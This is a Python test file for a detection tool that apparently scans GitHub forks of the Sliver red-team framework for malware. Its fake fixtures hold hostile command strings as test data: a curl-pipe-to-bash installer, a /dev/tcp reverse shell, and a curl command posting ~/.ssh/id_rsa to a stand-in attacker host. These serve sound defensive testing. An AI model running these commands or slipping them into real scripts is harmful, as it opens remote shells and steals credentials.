"""End-to-end hunt orchestration test with fakes (no network/git)."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.db import Database
from git_warden.hunt import hunt
from git_warden.models import RedTeamTool

TOOLS = [
    RedTeamTool(name="Sliver", org="BishopFox", repos=["BishopFox/sliver"], aliases=["sliver"])
]


def _fork(full_name):
    return {
        "full_name": full_name,
        "owner": {"login": full_name.split("/")[0]},
        "html_url": f"https://github.com/{full_name}",
        "fork": True,
        "stargazers_count": 0,
        "pushed_at": "2026-06-10T00:00:00Z",
    }


class FakeClient:
    def list_forks(self, owner, name, per_page=100, sort="newest"):
        return [_fork("evil/malware-sliver")] if name == "sliver" else []

    def search_repositories(self, query, per_page=10):
        return []

    def search_code(self, query, per_page=20):
        return []

    def get_readme(self, owner, name):
        return "Install: curl http://evil.tld/x | bash\n"  # remote-exec signal


def _fake_clone(full_name, dest, *, runner=None):
    dest.mkdir(parents=True, exist_ok=True)
    (dest / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\ncurl -d @~/.ssh/id_rsa https://x.evil\n",
        encoding="utf-8",
    )
    return dest


def test_hunt_lineage_to_confirmed_gold(tmp_path):
    db = Database.open(tmp_path / "h.sqlite")
    delivered = []

    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-1", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=True, gold=True,
        clone=_fake_clone,
        notifier=lambda row: (delivered.append(row["full_name"]) or True),
    )

    assert summary["counts"]["candidates"] == 1
    assert summary["counts"]["screened"] == 1   # malware token + renamed fork
    assert summary["counts"]["confirmed"] == 1  # Tier-2 bash scan confirmed
    assert summary["counts"]["gold_delivered"] == 1
    assert "evil/malware-sliver" in delivered

    row = db.findings_by_status("confirmed")[0]
    assert row["full_name"] == "evil/malware-sliver"
    payload = json.loads(row["raw_payload"])
    assert "code_hash" in payload
    assert row["code_hash"]  # promoted to a column for cross-platform dedup
    # eval #18: validate WHY it confirmed, not just the count.
    assert any(s.startswith("bash:") for s in json.loads(row["signals"]))
    assert row["score"] >= 5  # Tier-1 + accumulated bash_score
    assert "Tier-2 confirmed" in (row["reasoning"] or "")
    assert payload.get("bash_findings")  # provenance for the gold message
    db.close()


def test_hunt_limit_caps_candidates(tmp_path):
    db = Database.open(tmp_path / "h3.sqlite")

    class MultiForkClient(FakeClient):
        def list_forks(self, owner, name, per_page=100, sort="newest"):
            return [_fork(f"evil/sliver-clone-{i}") for i in range(5)] if name == "sliver" else []

    summary = hunt(
        db, MultiForkClient(), TOOLS,
        run_id="hunt-3", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=False, limit=2,
    )
    assert summary["counts"]["candidates"] == 2  # capped from 5
    db.close()


def test_hunt_without_tier2_leaves_candidates_screened(tmp_path):
    db = Database.open(tmp_path / "h2.sqlite")
    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-2", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=False, gold=False,
    )
    assert summary["counts"]["confirmed"] == 0
    assert summary["counts"]["screened"] == 1
    assert not db.findings_by_status("confirmed")
    db.close()
